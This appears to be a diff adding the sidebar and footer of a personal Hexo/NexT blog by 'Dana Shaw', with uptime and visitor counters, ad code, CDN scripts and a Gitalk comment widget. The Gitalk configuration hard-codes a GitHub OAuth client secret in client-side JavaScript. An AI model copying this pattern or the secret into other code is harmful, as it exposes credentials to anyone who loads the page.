class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+        <div id="">
+	  <canvas id="canvas" style="width:60%;">
+	    </div>
+	      <script type="text/javascript" src="/js/canvas-dance-time.js"></script>
+      <!--/noindex-->
+
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Dana Shaw"
+      src="/./images/photo.jpg">
+  <p class="site-author-name" itemprop="name">Dana Shaw</p>
+  <div class="site-description" itemprop="description">连尘埃也想收藏</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">238</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">81</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">384</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="noopener" target="_blank">windows提权学习</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+        function createtime() {
+	        var grt= new Date("01/07/2020 21:49:45");//此处修改你的建站时间或者网站上线时间
+		        now.setTime(now.getTime()+250);
+			        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+				        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+					        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+						        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+							        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+								        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+									        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+										        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+											    }
+											    setInterval("createtime()",250);
+											    </script>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Dana Shaw</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">512k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">7:46</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: '2dc357f83ef2282cb7cb',
+      clientSecret: '64ad793540c649b1f67bcbd2fc4c648b631176c5',
+      repo: 'DanaShaw.github.io',
+      owner: 'DanaShaw',
+      admin: ['DanaShaw'],
+      id: '168f04fd3b7e0b6e0196e6d276ed9df7',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222"
+     crossorigin="anonymous"></script>
+<!-- sidebar -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-3938956891324222"
+     data-ad-slot="6163650450"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
